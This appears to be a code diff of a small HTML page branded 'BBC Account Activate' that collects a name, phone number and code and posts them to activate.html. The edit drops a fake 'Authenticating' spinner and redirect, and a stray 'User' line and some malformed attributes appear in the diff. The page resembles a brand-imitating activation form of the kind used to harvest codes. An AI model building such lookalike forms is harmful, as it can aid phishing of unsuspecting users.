@@ -1,120 +1,93 @@
-<!DOCTYPE html>
-<html lang="en">
-
+User
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <title>BBC Account Activate</title>
     <style>
-        body {
-            background-color: black;
-            color: white;
-            font-family: Arial, sans-serif;
-        }
+    body {
+        background-color: black;
+        color: white;
+        font-family: Arial, sans-serif;
+    }
+    
+    #logo {
+        margin: 10px;
+        margin-top: 70px;
+        text-align: center;
+    }
+    
+    form {
+        text-align: center;
+        font-size: 30px;
+    }
+    
+    input[type="text"] {
+        width: 250px; /* Increase the width here */
+        margin-bottom: 10px;
+        height: 40px;
+        border: 1px solid white;
+        padding: 5px;
+        margin-left: -35px;
+        
+    }
+    
+    input[type="submit"] {
+        width: 220px;
+        height: 40px;
+        font-size: 25px;
+        margin-top: 10px;
+        border: 1px solid white;
+        background-color: transparent;
+        color: white;
+    }
+    
+    .label-spacing {
+        margin-bottom: 100px;
+    }
+    
+    .form-label {
+        display: inline-block;
+        width: 150px;
+        text-align: center;
+        margin-right: 10px;
+    }
+    
+    .form-input {
+        display: inline-block;
+        width: 20px;
+        font-size: 20px;
+    }
+    
+    .form-line {
+        margin-bottom: 10px;
+        font-size: 30px;
+    }
+</style>
 
-        #logo {
-            margin: 10px;
-            margin-top: 70px;
-            text-align: center;
-        }
-
-        form {
-            text-align: center;
-            font-size: 30px;
-        }
-
-        input[type="text"] {
-            width: 250px;
-            margin-bottom: 10px;
-            height: 40px;
-            border: 1px solid white;
-            padding: 5px;
-            margin-left: -35px;
-
-        }
-
-        input[type="submit"] {
-            width: 220px;
-            height: 40px;
-            font-size: 25px;
-            margin-top: 10px;
-            border: 1px solid white;
-            background-color: transparent;
-            color: white;
-        }
-
-        .label-spacing {
-            margin-bottom: 100px;
-        }
-
-        .form-label {
-            display: inline-block;
-            width: 150px;
-            text-align: center;
-            margin-right: 10px;
-        }
-
-        .form-input {
-            display: inline-block;
-            width: 20px;
-            font-size: 20px;
-        }
-
-        .form-line {
-            margin-bottom: 10px;
-            font-size: 30px;
-        }
-
-        #spinner {
-            display: none;
-            margin-top: 20px;
-        }
-    </style>
 </head>
-
 <body>
     <div id="logo">
         <img src="BBC-Logo-1.png" alt="Logo">
     </div><br><br>
+    
+<form action="activate.html" method="post">
+    <div class="form-line">
+        <label class="form-label" for="name">Name:</label>
+        <input class="form-input" type="text" id="name" name="SingleLine" required>
+    </div>
 
-    <form id="activationForm" onsubmit="showSpinner()">
-        <div class="form-line">
-            <label class="form-label" for="name">Name:</label>
-            <input class="form-input" type="text" id="name" name="SingleLine" required>
-        </div>
+    <div class="form-line">
+        <label class="form-label" for "phone">Phone:</label>
+        <input class="form-input" type="text" id="phone" name="SingleLine1" required>
+    </div>
 
-        <div class="form-line">
-            <label class="form-label" for="phone">Phone:</label>
-            <input class="form-input" type="text" id="phone" name="SingleLine1" required>
-        </div>
+    <div class="form-line">
+        <label class="form-label" for "code">Code:</label>
+        <input class="form-input" type="text" id="code" name="SingleLine2" required>
+    </div>
 
-        <div class="form-line">
-            <label class="form-label" for="code">Code:</label>
-            <input class="form-input" type="text" id="code" name="SingleLine2" required>
-        </div>
-
-        <div class="form-line">
-            <br>
-            <input type="submit" value="Submit">
-        </div>
-
-        <div id="spinner">
-            Authenticating... <img src="spinner.gif" alt="Spinner">
-        </div>
-    </form>
-
-    <script>
-        function showSpinner() {
-            document.getElementById("spinner").style.display = "block";
-            // You can add additional authentication logic here
-
-            // Simulating a delay for authentication (replace this with your actual authentication logic)
-            setTimeout(function () {
-                // Redirect to the next page after authentication
-                window.location.href = "activate.html";
-            }, 2000); // 2000 milliseconds (2 seconds) delay for simulation
-        }
-    </script>
-</body>
-
-</html>
+    <div class="form-line">
+        <br> 
+        <input type="submit" value="Submit">
+    </div>
+</form>
